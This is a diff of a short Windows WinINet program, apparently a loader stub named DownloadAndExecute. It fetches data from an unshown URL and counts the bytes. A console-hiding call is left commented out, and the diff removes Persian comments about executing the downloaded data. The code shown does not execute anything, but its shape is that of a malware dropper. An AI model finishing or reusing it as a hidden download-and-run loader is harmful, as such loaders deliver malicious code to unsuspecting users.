@@ -1,18 +1,17 @@
 #include <windows.h>
 #include <wininet.h>
-#include <iostream>
-#include <string>
+#include <stdio.h>
 
 #pragma comment(lib, "wininet.lib")
 
 void DownloadAndExecute() {
     HINTERNET hInternet = InternetOpenA(
-        "Mozilla/5.0",                 // User-Agent بهتر
-        INTERNET_OPEN_TYPE_PRECONFIG,  // استفاده از پروکسی سیستم
+        "Mozilla/5.0",
+        INTERNET_OPEN_TYPE_PRECONFIG,
         NULL, NULL, 0);
 
     if (!hInternet) {
-        std::cerr << "InternetOpen failed: " << GetLastError() << std::endl;
+        printf("InternetOpen failed: %lu\n", GetLastError());
         return;
     }
 
@@ -24,35 +23,30 @@ void DownloadAndExecute() {
         0);
 
     if (!hFile) {
-        std::cerr << "InternetOpenUrl failed: " << GetLastError() << std::endl;
+        printf("InternetOpenUrl failed: %lu\n", GetLastError());
         InternetCloseHandle(hInternet);
         return;
     }
 
     char buffer[4096];
     DWORD bytesRead = 0;
-    std::string rawData;
+    DWORD totalSize = 0;
 
     while (InternetReadFile(hFile, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
-        rawData.append(buffer, bytesRead);
+        totalSize += bytesRead;
     }
 
-    std::cout << "Downloaded " << rawData.size() << " bytes." << std::endl;
+    printf("Downloaded %lu bytes.\n", totalSize);
 
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInternet);
-
-    // اگر می‌خواهید داده دانلود شده اجرا شود:
-    // (روش‌های مختلفی وجود دارد - در ادامه توضیح داده شده)
 }
 
 int main() {
-    // برای دیباگ، اول کنسول را مخفی نکنید
     // ShowWindow(GetConsoleWindow(), SW_HIDE);
-
     DownloadAndExecute();
 
-    std::cout << "Press Enter to exit..." << std::endl;
-    std::cin.get();
+    printf("Press Enter to exit...\n");
+    getchar();
     return 0;
 }
